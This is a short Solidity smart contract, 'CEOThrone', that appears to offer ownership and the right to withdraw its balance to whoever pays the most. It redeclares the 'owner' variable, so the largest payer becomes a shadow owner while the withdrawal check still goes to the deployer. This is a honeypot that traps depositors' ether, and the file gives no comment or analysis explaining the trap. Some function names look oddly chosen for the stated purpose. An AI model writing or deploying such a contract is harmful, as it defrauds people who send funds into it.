pragma solidity ^0.4.19;


contract Ownable {
    address public owner;
    function Ownable() public {owner = msg.sender;}
    modifier onlyOwner() {require(msg.sender == owner); _;
    }
}


contract CEOThrone is Ownable {
    address public owner;
    uint public largestPledge;


    function CommitCoverage() public payable {

        if (msg.value > largestPledge) {
            owner = msg.sender;
            largestPledge = msg.value;
        }
    }

    function extractSpecimen() public onlyOwner {

        msg.sender.transfer(this.balance);
    }
}